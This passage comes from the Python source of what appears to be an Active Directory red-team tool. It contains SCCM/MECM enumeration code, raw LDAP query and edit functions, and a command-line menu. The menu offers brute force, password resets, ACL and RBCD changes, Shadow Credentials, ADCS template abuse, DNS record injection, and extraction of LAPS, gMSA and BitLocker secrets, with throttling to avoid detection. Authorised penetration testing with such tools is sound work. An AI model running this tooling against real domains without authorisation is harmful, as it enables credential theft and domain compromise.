												description = description[0].decode()
											else:
												description = "<Empty>"
											dnsExist = False
											for sc in siteCodes.keys():
												for idx, val in enumerate(siteCodes[sc]):
													pDNS = val[0]
													if pDNS == dns:
														dnsExist = True
														siteCodes[sc][idx] += ['SiteServer']
														break
											if not dnsExist:
												unresolvedComputers += [[dns, description, 'SiteServer']]

		# Find all SCCM / MECM related entries
		entry_generator = search(conn, server, filter = "(|(servicePrincipalName=*sccm*)(servicePrincipalName=*mecm*)(samaccountname=*sccm*)(samaccountname=*mecm*)(description=*sccm*)(description=*mecm*)(name=*sccm*)(name=*mecm*))",
						   								attributes = ["objectClass", "distinguishedName", "dNSHostName", "description"])
		i = 0
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1

				objClass = entry["raw_attributes"]["objectClass"]
				distinguishedName = entry["raw_attributes"]["distinguishedName"][0].decode()
				description =  entry["raw_attributes"]["description"]
				if description != []:
					description = description[0].decode()
				else:
					description = "<Empty>"
				if b'computer' in objClass:
					dns = entry["raw_attributes"]["dNSHostName"][0].decode()
					dnsExist = False
					for sc in siteCodes.keys():
						for idx, val in enumerate(siteCodes[sc]):
							pDNS = val[0]
							if pDNS == dns:
								dnsExist = True
								break
					if not dnsExist:
						unresolvedComputers += [[dns, description, 'Computer']]
				elif b'user' in objClass:
					unresolvedUsers += [[distinguishedName, description, 'User']]
				elif b'group' in objClass:
					unresolvedGroups += [[distinguishedName, description, 'Group']]
				else:
					pass

		if nbentries == 0:
			print("[-] No SCCM / MECM endpoints found")

		# Continue analysis through SMB/MSSQL/HTTP
		else: 
			for siteCode in siteCodes.keys():
				if siteCodes[siteCode] != []:
					for idx, entry in enumerate(siteCodes[siteCode]):
						dns = entry[0]
						roles = entry[1:]
						print(f"[+] Profiling '{dns}' through SMB/HTTP/MSSQL")
						signing, foundSiteCode, siteServ, passive, DP, WSUS, WDSPXE, SCCMPXE, siteDatabase, mgmtPoint, smsProvider = profileSCCM(dns, username, password, domain, ntHash, aesKey, ccache)
						if signing:
							siteCodes[siteCode][idx] += ['SMBSigningEnabled']
						else:
							siteCodes[siteCode][idx] += ['SMBSigningDisabled']
						if foundSiteCode != None:
							if foundSiteCode != siteCode:
								print(f"\t[-] Found Site Code '{foundSiteCode}' != Original Site Code '{siteCode}'. Adding as additionnal", file = sys.stderr)
								siteCodes[siteCode][idx] += [foundSiteCode]
						if siteServ:
							if not 'SiteServer' in roles:
								siteCodes[siteCode][idx] += ['SiteServ']
							if passive:
								siteCodes[siteCode][idx] += ['Passive']
						if DP:
							if not 'DistributionPoint' in roles:
								siteCodes[siteCode][idx] += ['DistributionPoint']
						if WSUS:
							siteCodes[siteCode][idx] += ['WSUS']
						if WDSPXE:
							if not 'WDSPXE' in roles:
								siteCodes[siteCode][idx] += ['WDSPXE']
						if SCCMPXE:
							siteCodes[siteCode][idx] += ['SCCMPXE']
						if siteDatabase:
							siteCodes[siteCode][idx] += ['SiteDatabase']
						if mgmtPoint:
							if not 'ManagementPoint' in roles:
								siteCodes[siteCode][idx] += ['ManagementPoint']
						if smsProvider:
							siteCodes[siteCode][idx] += ['SMSProvider']
			
			toRemoveFromUnresolvedComputers = []
			for idx, computer in enumerate(unresolvedComputers):
				dns = computer[0]
				print(f"[+] Profiling '{dns}' through SMB/HTTP/MSSQL")
				signing, foundSiteCode, siteServ, passive, DP, WSUS, WDSPXE, SCCMPXE, siteDatabase, mgmtPoint, smsProvider = profileSCCM(dns, username, password, domain, ntHash, aesKey, ccache)
				if foundSiteCode != None: # Add It to siteCodes and computers to remove from unresolvedComputers
					toRemoveFromUnresolvedComputers += [dns]

					casSiteCode = False
					if not foundSiteCode in siteCodes.keys(): # This is a Central Administration Site (CAS) site code
						casSiteCode = True
						siteCodes[foundSiteCode] = []	
					if signing:
						siteCodes[foundSiteCode] += [[dns, 'SMBSigningEnabled']]
					else:
						siteCodes[foundSiteCode] += [[dns, 'SMBSigningDisabled']]
					idx = len(siteCodes[foundSiteCode])-1
					if casSiteCode:
						siteCodes[foundSiteCode][idx] += ['CAS']
					if siteServ:
						siteCodes[foundSiteCode][idx] += ['SiteServer']
						if passive:
							siteCodes[foundSiteCode][idx] += ['Passive']
					if DP:
						siteCodes[foundSiteCode][idx] += ['DistributionPoint']
					if WSUS:
						siteCodes[foundSiteCode][idx] += ['WSUS']
					if WDSPXE:
						siteCodes[foundSiteCode][idx] += ['WDSPXE']
					if SCCMPXE:
						siteCodes[foundSiteCode][idx] += ['SCCMPXE']	
					if siteDatabase:
						siteCodes[foundSiteCode][idx] += ['SiteDatabase']
					if mgmtPoint:
						siteCodes[foundSiteCode][idx] += ['ManagementPoint']
					if smsProvider:
						siteCodes[foundSiteCode][idx] += ['SMSProvider']
				else: # Will remain an unresolved computer
					if signing:
						unresolvedComputers[idx] += ['SMBSigningEnabled']
					else:
						unresolvedComputers[idx] += ['SMBSigningDisabled']
					if siteServ:
						unresolvedComputers[idx] += ['SiteServ']
						if passive:
							unresolvedComputers[idx] += ['Passive']
					if DP:
						unresolvedComputers[idx] += ['DistributionPoint']
					if WSUS:
						unresolvedComputers[idx] += ['WSUS']
					if WDSPXE:
						unresolvedComputers[idx] += ['WDSPXE']
					if SCCMPXE:
						unresolvedComputers[idx] += ['SCCMPXE']
					if siteDatabase:
						unresolvedComputers[idx] += ['SiteDatabase']
					if mgmtPoint:
						unresolvedComputers[idx] += ['ManagementPoint']
					if smsProvider:
						unresolvedComputers[idx] += ['SMSProvider']
			x = enumerate(unresolvedComputers)
			for idx, computer in x:
				dns = computer[0]
				if dns in toRemoveFromUnresolvedComputers:
					unresolvedComputers = unresolvedComputers[:idx] + unresolvedComputers[idx+1:]
		
		# Display results: siteCodes, casSiteCodes, unresolved objects
		for siteCode in siteCodes.keys():
			print(f"[+] Site Code = {siteCode}")
			if siteCodes[siteCode] != []:
				for entry in siteCodes[siteCode]:
					dns = entry[0]
					roles = entry[1:]
					print("\t[+] [{}] {}".format(','.join(roles), dns))
			else:
				print("\t[+] No computers found")
		for casSiteCode in casSiteCodes:
			print(f"[+] Found Central Administration Site (CAS) = {casSiteCode}")
		if unresolvedComputers != []:
			print("[+] Found computers potentially linked to SCCM / MECM")
			for unresolvedComputer in unresolvedComputers:
				roles = ','.join(unresolvedComputer[2:])
				print(f"\t[+] [{roles}] {unresolvedComputer[0]} / Description = {unresolvedComputer[1]}")
		if unresolvedUsers != []:
			print("[+] Found users potentially linked to SCCM / MECM")
			for unresolvedUser in unresolvedUsers:
				print(f"\t[+] [{unresolvedUser[2]}] {unresolvedUser[0]} / Description = {unresolvedUser[1]}")
		if unresolvedGroups != []:
			print("[+] Found groups potentially linked to SCCM / MECM")
			for unresolvedGroup in unresolvedGroups:
				print(f"\t[+] [{unresolvedGroup[2]}] {unresolvedGroup[0]} / Description = {unresolvedGroup[1]}")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###########################################################
#                     Raw LDAP query                      #
###########################################################

def LDAPQuery(conn, server, signing, ldaps, startTLS, channelBinding, username, domain, aesKey, ccache, baseDN, filter = "(objectClass=*)", attributes = [ALL_ATTRIBUTES, ALL_OPERATIONAL_ATTRIBUTES]):
	print_yellow("[*] Sending raw LDAP query")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return
		
		domainRootDN = server.info.other['defaultNamingContext'][0]
		forestRootDN = server.info.other['rootDomainNamingContext'][0]
		
		if forestRootDN != domainRootDN and (ccache != None or aesKey != None): # ST is required

			targetDomain = ('.'.join([x.strip("DC=") for x in forestRootDN.split(",")])).lower()
			foundKDCHost = True
			kdcHost = None

			print(f"[+] Connecting with Kerberos to {targetDomain.upper()} for cross-realm")
			
			# We need the PDC FQDN for the target domain to request a valid SPN
			# Find It by querying SRV record for '_ldap._tcp.pdc._msdcs.<FQDN>' through UDP and TCP
			try:
				kdcHost = str(dns.resolver.resolve(f"_ldap._tcp.pdc._msdcs.{targetDomain}", "SRV", tcp = False)[0].target)[:-1]
			except:
				try:
					kdcHost = str(dns.resolver.resolve(f"_ldap._tcp.pdc._msdcs.{targetDomain}", "SRV", tcp = True)[0].target)[:-1]
				except:
					foundKDCHost = False
			
			if not foundKDCHost:
				print(f"[-] Could not find PDC FQDN domain {targetDomain.upper()}", file = sys.stderr)
				return

			originalSTDOUT = sys.stdout
			sys.stdout = StringIO()
			conn, server = connect_ldap(kdcHost, signing, ldaps, startTLS, channelBinding, username, '', '', domain, aesKey, ccache, None, None, None)
			sys.stdout = originalSTDOUT
			if conn == '':
				return

		entry_generator = search(conn, server, baseDN, filter = filter, attributes = attributes)
		nbentries = 0
		i = 0
		global PAGED_SIZE
		for entry in entry_generator:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1
				dict = entry["raw_attributes"]
				print("[+] Entry {}:".format(nbentries))
				for key, value in dict.items():
					print("\t{}: {}".format(key, value))

		print(f"[+] Returned {nbentries} entries")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def LDAPEdit(conn, server, object, attribute, newValB64):
	print_yellow("[*] Editing provided object's attribute")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		dns = getDNs(conn, server, [object])

		if len(dns) == 0:
			print("[-] Provided AD object not found", file = sys.stderr)
			return
		
		res = writeBytes(conn, dns[0], attribute, base64.b64decode(newValB64))
		if res['result'] == 0:
			print("[+] Object's attribute successfully edited")
		else:
			print(f"[-] Failed to edit object's attribute: {res}", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##################################################
#                     MAIN                       #
##################################################

def print_red(text):
	print("\033[91m" + text + "\033[0m")

def print_yellow(text):
	print("\033[93m" + text + "\033[0m")

def parseTarget(target):
	import ipaddress, re

	cidrRegex = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$|^(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}/[0-9]{1,3}$"
	isFile = False
	isMultipleIPs = False

	res = []

	tmp = []
	try:
		with open(target, "r") as f:
			tmp = [line.rstrip('\n') for line in f.readlines()]
			isFile = True
	except:
		pass

	if not isFile:
		if target.find(",") != -1:
			tmp = target.split(",")
			isMultipleIPs = True

	if not isFile and not isMultipleIPs:
		tmp = [target]

	for entry in tmp:
		if re.match(cidrRegex, entry):
			network = ipaddress.ip_network(entry, strict = False)
			for ip in network:
				res.append(str(ip))
		else:
			res.append(entry)

	return res

def maybeSleep(deep = True, inAction = False):
	global THROTTLE, THROTTLE_DEEP
	if deep:
		if THROTTLE_DEEP != None:
			print("\n--- SLEEPING ---\n")
			time.sleep(THROTTLE_DEEP)
	else:
		if THROTTLE != None and THROTTLE_DEEP == None:
			print("--- SLEEPING ---\n")
			time.sleep(THROTTLE)
	if inAction and THROTTLE_DEEP == None:
		print()

def add_arguments(parser):
	auth_group = parser.add_argument_group('[[ Authentication ]]')
	auth_group.add_argument("--ldaps", help = "Use LDAPS", action = "store_true")
	auth_group.add_argument("--startTLS", help = "Use Start-TLS", action = "store_true")
	auth_group.add_argument("--channelBinding", help = "Use Channel Binding", action = "store_true")
	auth_group.add_argument("--signing", help = "Use LDAP Signing (No LDAPS/Start-TLS)", action = "store_true")
	auth_group.add_argument("--checkProtections", help = "Check LDAP Signing & LDAPS Channel Binding (EPA)", action = "store_true")

	bf_group = parser.add_argument_group('[[ Brute Force ]]')
	bf_group.add_argument("--doBF", help = "Perform Brute Force with provided credentials (Usernames/Pwds/NT hashes files or single values)", action = "store_true")
	bf_group.add_argument("--passLogin", help = "Try Password = Login", action = "store_true")

	acls_group = parser.add_argument_group('[[ ACLs ]]')
	acls_group.add_argument("--listACLs", help = "List all ACLs", action = "store_true")
	acls_group.add_argument("--descriptorAttributes", help = "Security Descriptor attributes to search into. Commas separated list. Default = nTSecurityDescriptor, msDS-GroupMSAMembership, msExchMailboxSecurityDescriptor", default = "nTSecurityDescriptor, msDS-GroupMSAMembership, msExchMailboxSecurityDescriptor")
	acls_group.add_argument("--listACLTrusts", help = "List AD objects' ACEs on which provided AD objects (samAccountName, name, distinguishedName) are trusted. Colon separated list")
	acls_group.add_argument("--recursiveTrusts", help = "Recursively check AD objects' memberships in groups/OUs for ACEs trusts", action = "store_true")
	acls_group.add_argument("--vulnerableTrusts", help = "Display only vulnerable ACEs trusts", action = "store_true")
	acls_group.add_argument("--resetPwd", help = "Reset account password (require User-Force-Change-Password or old password) from <samAccountName|name|distinguishedName>:[<OldPwdB64>]:<NewPwdB64>")
	acls_group.add_argument("--getACL", help = "Get ACL for the provided AD objects (samAccountName, name, distinguishedName). Colon separated list")
	acls_group.add_argument("--setACL", help = "Set ACL for the provided AD object (samAccountName, name, distinguishedName) and SDDL string in the form of <Object>|<SDDL>")
	acls_group.add_argument("--SDFlags", help = "Define which Security Descriptor part to edit from OWNER_SECURITY_INFORMATION, GROUP_SECURITY_INFORMATION, DACL_SECURITY_INFORMATION, SACL_SECURITY_INFORMATION. Commas separated list. Default = All parts except SACL")

	ntsecuritydesc_group = parser.add_argument_group('[[ nTSecurityDescriptor ]]')
	ntsecuritydesc_group.add_argument("--buildNTSecurityDescriptor", help = "Build nTSecurityDescriptor in binary format Base64-encoded from SDDL string that describe the Owner + Group + DACL for the object")
	ntsecuritydesc_group.add_argument("--parseNTSecurityDescriptor", help = "Parse nTSecurityDescriptor in binary format Base64-encoded that describe the Owner + Group + DACL for the object to SDDL string")
	ntsecuritydesc_group.add_argument("--ADCSObject", help = "nTSecurityDescriptor is for ADCS Certification Authority object (CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=<Subdomain>,DC=<TLD>). Default = False", action = "store_true")

	kerbDeleg_group = parser.add_argument_group('[[ Kerberos Delegations ]]')
	kerbDeleg_group.add_argument("--listKerbDeleg", help = "List Kerberos Delegations (KUD, KCD, RBCD) alllowed for provided AD objects (samAccountName, name, distinguishedName). Colon separated list")

	allowedToActOnBehalfOfOtherIdentity_group = parser.add_argument_group('[[ msDS-AllowedToActOnBehalfOfOtherIdentity : RBCD ]]')
	allowedToActOnBehalfOfOtherIdentity_group.add_argument("--buildAllowedToActOnBehalfOfOtherIdentity", help = "Build msDS-AllowedToActOnBehalfOfOtherIdentity in binary format Base64-encoded from SDDL string that describe the object Owner + Group + DACL allowed to act on behalf")
	allowedToActOnBehalfOfOtherIdentity_group.add_argument("--parseAllowedToActOnBehalfOfOtherIdentity", help = "Parse msDS-AllowedToActOnBehalfOfOtherIdentity from SDDL in Base64 that describe the object Owner + Group + DACL allowed to act on behalf")
	allowedToActOnBehalfOfOtherIdentity_group.add_argument("--setRBCD", help = "Set RBCD for AD object 1 on AD object 2 in the form of <Object1>:<Object2>")

	objectGUID_group = parser.add_argument_group('[[ objectGUID ]]')
	objectGUID_group.add_argument("--buildObjectGUID", help = "Build objectGUID in binary format Base64-encoded from GUID string that describe the GUID of the object")
	objectGUID_group.add_argument("--parseObjectGUID", help = "Parse objectGUID from GUID in Base64 that describe the GUID of the object")

	objectSID_group = parser.add_argument_group('[[ objectSID ]]')
	objectSID_group.add_argument("--buildObjectSID", help = "Build objectSid in binary format Base64-encoded from SID string that describe the SID of the object")
	objectSID_group.add_argument("--parseObjectSID", help = "Parse objectSid from SID in Base64 that describe the SID of the object")
	objectSID_group.add_argument("--getSIDs", help = "Get SIDs of provided AD objects (samAccountName, name, distinguishedName). Colon separated list")
	objectSID_group.add_argument("--SIDsToSAMs", help = "Get samAccountNames of provided SIDs' string. Commas separated list")

	userAccountControl_group = parser.add_argument_group('[[ userAccountControl ]]')
	userAccountControl_group.add_argument("--buildUAC", help = "Build userAccountControl integer value from userAccountControl accesses string that describe the object properties. Ex: DONT_REQ_PREAUTH|TRUSTED_FOR_DELEGATION")
	userAccountControl_group.add_argument("--parseUAC", type = int, help = "Parse userAccountControl from integer value that describe the object properties")

	member_group = parser.add_argument_group('[[ Membership ]]')
	member_group.add_argument('--listMembers', help = "List recursively members of the provided AD objects (samAccountName, name, distinguishedName). Colon separated list")
	member_group.add_argument('--listMemberOfs', help = "List recursively groups/OUs of the provided AD objects (samAccountName, name, distinguishedName). Colon separated list")

	kerbNoPreauth_group = parser.add_argument_group('[[ Kerberos Pre-Authentication ]]')
	kerbNoPreauth_group.add_argument("--listKerbNoPreauth", help = "List AD accounts without Kerberos Pre-Authentication from DONT_REQ_PREAUTH (UAC)", action = "store_true")

	kerberoastable_group = parser.add_argument_group('[[ Kerberoastable ]]')
	kerberoastable_group.add_argument("--listKerberoastable", help = "List AD users (no computers) with SPN(s)", action = "store_true")

	domainPolicy_group = parser.add_argument_group('[[ Domain Password Policy ]]')
	domainPolicy_group.add_argument("--getDefaultDomainPwdPolicy", help = "Get Default Domain Password Policy", action = "store_true")
	domainPolicy_group.add_argument("--listPSO", help = "List Password Setting Objects (PSO)", action = "store_true")
	domainPolicy_group.add_argument("--resolvePSOAppliesTo", help = "Resolve recursively PSO targets members", action = "store_true")

	gMSA_group = parser.add_argument_group('[[ gMSA ]]')
	gMSA_group.add_argument("--listGMSA", help = "List gMSA accounts. LDAPS or LDAP with StartTLS required for msDS-ManagedPassword", action = "store_true")

	LAPS_group = parser.add_argument_group('[[ LAPS ]]')
	LAPS_group.add_argument("--listLAPS", help = "List LA pwds managed by LAPS", action = "store_true")

	Bitlocker_group = parser.add_argument_group('[[ Bitlocker ]]')
	Bitlocker_group.add_argument("--listBitlocker", help = "List Bitlocker Recovery Keys", action = "store_true")

	pwds_group = parser.add_argument_group('[[ LDAP Passwords ]]')
	pwds_group.add_argument("--listDesc", help = "List AD accounts' LDAP Description attribute", action = "store_true")
	pwds_group.add_argument("--descFilter", help = "Keywords to filter on LDAP Description attribute. Commas separated list")
	pwds_group.add_argument("--listPwdsAttr", help = "List accounts with attributes that may contain pwds (userPassword, unicodePwd, unixUserPassword, msSFU30Password, orclCommonAttribute, defender-tokenData)", action = "store_true")
	pwds_group.add_argument("--listPwdsNotRequired", help = "List accounts with PASSWD_NOTREQD (UAC)", action = "store_true")
	pwds_group.add_argument("--listPwdsDontExpired", help = "List accounts with DONT_EXPIRE_PASSWORD (UAC)", action = "store_true")
	pwds_group.add_argument("--listPwdsExpired", help = "List accounts with PASSWORD_EXPIRED (UAC)", action = "store_true")
	pwds_group.add_argument("--listPwdsReversibleEncryption", help = "List accounts with ENCRYPTED_TEXT_PWD_ALLOWED (UAC) for Reversible Encryption", action = "store_true")

	accounts_group = parser.add_argument_group('[[ Accounts ]]')
	accounts_group.add_argument("--listAccDisabled", help = "List AD accounts disabled with ACCOUNTDISABLE (UAC)", action = "store_true")
	accounts_group.add_argument("--listAccLocked", help = "List AD accounts locked with LOCKOUT (UAC)", action = "store_true")
	accounts_group.add_argument("--listUsers", help = "List AD users", action = "store_true")
	accounts_group.add_argument("--listComputers", help = "List AD computers", action = "store_true")

	os_group = parser.add_argument_group('[[ Operating System ]]')
	os_group.add_argument("--listOS", help = "List AD computers OS versions", action = "store_true")

	pre2k_group = parser.add_argument_group('[[ Pre-2K Computers ]]')
	pre2k_group.add_argument("--listPRE2K", help = "List Pre-2K computers with logonCount = 0", action = "store_true")

	adcs_group = parser.add_argument_group('[[ ADCS ]]')
	adcs_group.add_argument("--listADCS", help = "List ADCS CAs and Templates", action = "store_true")
	adcs_group.add_argument("--vulnerableADCS", help = "Display only ESC<X> (for ESC5 use listACLTrusts) vulnerable CAs and Templates for provided AD objects (samAccountName, name, distinguishedName). Colon separated list")
	adcs_group.add_argument("--editTemplate", help = "Edit provided ADCS Template from displayName")
	adcs_group.add_argument("--EKU", help = "Extended Key Usage values to set. Commas separated list. Example: Client Authentication,Any Purpose,Certificate Request Agent")
	adcs_group.add_argument("--certificateNameFlag", help = "Certificate Name Flag values to set. Commas separated list. Example: ENROLLEE_SUPPLIES_SUBJECT. NONE for empty")
	adcs_group.add_argument("--enrollmentFlag", help = "Enrollment Flag values to set. Commas separated list. Example: AUTO_ENROLLMENT. NONE for empty")

	adidns_group = parser.add_argument_group('[[ ADIDNS ]]')
	adidns_group.add_argument("--listZones", help = "List DNS zones", action = "store_true")
	adidns_group.add_argument("--listRecords", help = "List DNS records for the provided zone")
	adidns_group.add_argument("--manageRecord", help = '''Manage record from <Action>:<DNSPartition>:<Zone>:<EntryName>:[<RecordIndex>]:[<RecordValue>] with
	<Action>
		"ADD"                   Add new A record (DNS entry is created if it does not exist, otherwise the record value is added)
		"QUERY"                 Query records of provided DNS entry
		"REPLACE"               Replace the record at provided index with given A record value. Records indexes may swap after modification					
		"REMOVE"                Remove record at provided index into entry or tombstoned It if only one record into entry
		"DELETE"                Delete the DNS entry
		"RESURRECT"             Resurrect a tombstoned DNS entry
	<DNSPartition>
		"Forest"                Forest-wide application directory partition
		"Domain"                Domain-wide application directory partition
		"Legacy"                System partition (Legacy DNS storage)
	<Zone>
		<Zone>                  The DNS zone name to manage entry
	<EntryName>					
		<EntryName>             The DNS entry name to manage record
	<RecordIndex>
		<RecordIndex>           The DNS record index to manage
	<RecordValue>
		<RecordValue>           The record IPv4 address value''')

	gpos_group = parser.add_argument_group('[[ GPO ]]')
	gpos_group.add_argument("--listGPOs", help = "List and parse Group Policy Objects (GPO)", action = "store_true")
	gpos_group.add_argument("--resolveMembers", help = "Resolve members of objects targeted by GPOs. Default = False", action = "store_true")

	ous_group = parser.add_argument_group('[[ OU ]]')
	ous_group.add_argument("--listOUs", help = "List Organizational Units (OU) and their members", action = "store_true")

	dcs_group = parser.add_argument_group('[[ DCs ]]')
	dcs_group.add_argument("--listDCs", help = "List Domain Controllers (PDC, RW and RODC)", action = "store_true")

	inheritance_group = parser.add_argument_group('[[ Inheritance ]]')
	inheritance_group.add_argument("--getInheritance", help = "Get ACLs/GPOs inheritance for provided AD objects (samAccountName, name, distinguishedName) through adminCount and gPOptions attributes. Colon separated list")

	trusts_group = parser.add_argument_group('[[ Domain Trusts ]]')
	trusts_group.add_argument("--listDomainTrusts", help = "List and parse domain trusts", action = "store_true")

	foreign_group = parser.add_argument_group('[[ Foreign Security Principals ]]')
	foreign_group.add_argument("--listForeignPrincipals", help = "List Foreign Security Principals", action = "store_true")
	foreign_group.add_argument("--resolveSIDs", help = "Resolve principals' sids by querying trusted domains. Default = False", action = "store_true")
	foreign_group.add_argument("--filterSIDs", help = "Filter principals to search with provided SIDs. Commas separated list")

	shadowcreds_group = parser.add_argument_group('[[ Shadow Creds ]]')
	shadowcreds_group.add_argument("--shadowCreds", help = "Add Shadow Creds through msDS-KeyCredentialLink attribute of the provided samAccountName")
	shadowcreds_group.add_argument("--exportType", help = "Export type of the generated certificate. Default = PFX", choices = ['PEM', 'PFX'], default = 'PFX')
	shadowcreds_group.add_argument("--pfxPwd", help = "PFX password to use when generating PFX certificate")

	shadowcreds_group = parser.add_argument_group('[[ SCCM / MECM ]]')
	shadowcreds_group.add_argument("--listSCCM", help = "List SCCM / MECM endpoints", action = "store_true")

	rawLDAPQuery_group = parser.add_argument_group('[[ Raw LDAP query ]]')
	rawLDAPQuery_group.add_argument("--searchFilter", help = "Perform raw LDAP query based on provided filter")
	rawLDAPQuery_group.add_argument("--searchAttributes", help = "LDAP attributes to search for. Commas separated list")
	rawLDAPQuery_group.add_argument("--searchBaseDN", help = "LDAP Base DN to search into. Example: OU=MyOU,DC=MyDomain,DC=TLD")
	rawLDAPQuery_group.add_argument("--editAttribute", help = "Edit LDAP object's attribute with provided value in the form of <samAccountName|name|distinguishedName>:<AttributeName>:<Base64NewValue>")

PAGED_SIZE = 100
THROTTLE = None
THROTTLE_DEEP = None
def handle_arguments(args):
	targets = ['LOCAL']
	if args.target != None:    
		targets = parseTarget(args.target)
	if args.shuffle:    
		random.shuffle(targets)
	if args.throttle != None:
		global THROTTLE
		THROTTLE = args.throttle
	if args.throttleDeep != None:
		global THROTTLE_DEEP
		THROTTLE_DEEP = args.throttleDeep

	firstTarget = True

	for target in targets:
		if not firstTarget:
			maybeSleep(deep = False)
		else:
			firstTarget = False

		print_red("|---------------------------")
		print_red(f"| {target}")
		print_red("|---------------------------")
		print()

		conn = None

		# Authentication
		if args.checkProtections:
			checkProtections(target, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache)
			maybeSleep(inAction = True)
		
		# Brute Force
		if args.doBF:
			doBF(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.passLogin)
			maybeSleep(inAction = True)
		
		# ACLs
		if args.listACLs:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listACLs(conn, server, args.descriptorAttributes.split(','))
			maybeSleep(inAction = True)
		if args.listACLTrusts != None:
			objects = args.listACLTrusts.split(":")
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listACLTrusts(conn, server, target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, objects, args.recursiveTrusts, args.vulnerableTrusts, args.descriptorAttributes.split(','))
			maybeSleep(inAction = True)
		if args.getACL != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			getACL(conn, server, args.getACL.split(':'), args.descriptorAttributes.split(','))
			maybeSleep(inAction = True)
		if args.setACL != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			setACL(conn, server, *args.setACL.split('|'), args.SDFlags)
			maybeSleep(inAction = True)
		if args.resetPwd != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			resetPwd(conn, server, *args.resetPwd.split(":"))
			maybeSleep(inAction = True)
		
		# nTSecurityDescriptor
		if args.buildNTSecurityDescriptor != None:
			NTSecurityDescriptor = buildNTSecurityDescriptor(args.buildNTSecurityDescriptor, args.ADCSObject)
			print()
		if args.parseNTSecurityDescriptor != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			sddl = parseNTSecurityDescriptor(conn, server, base64.b64decode(args.parseNTSecurityDescriptor), args.ADCSObject)
			maybeSleep(inAction = True)

		# Kerberos Delegations
		if args.listKerbDeleg != None:
			objects = args.listKerbDeleg.split(":")
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listKerbDeleg(conn, server, objects)
			maybeSleep(inAction = True)
		
		# msDS-AllowedToActOnBehalfOfOtherIdentity : RBCD
		if args.buildAllowedToActOnBehalfOfOtherIdentity != None:
			allowedToActOnBehalfOfOtherIdentity = buildAllowedToActOnBehalfOfOtherIdentity(args.buildAllowedToActOnBehalfOfOtherIdentity)
			print()
		if args.parseAllowedToActOnBehalfOfOtherIdentity != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			sddl = parseAllowedToActOnBehalfOfOtherIdentity(conn, server, args.parseAllowedToActOnBehalfOfOtherIdentity)
			maybeSleep(inAction = True)
		if args.setRBCD != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			setRBCD(conn, server, *args.setRBCD.split(":"))
			maybeSleep(inAction = True)
		
		# objectGUID
		if args.buildObjectGUID != None:
			objectGUID = buildObjectGUID(args.buildObjectGUID)
			print()
		if args.parseObjectGUID != None:
			guid = parseObjectGUID(args.parseObjectGUID)
			print()

		# objectSID
		if args.buildObjectSID != None:
			objectSID = buildObjectSID(args.buildObjectSID)
			print()
		if args.parseObjectSID != None:
			sid = parseObjectSID(args.parseObjectSID)
			print()
		if args.getSIDs != None:
			objects = args.getSIDs.split(":")
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
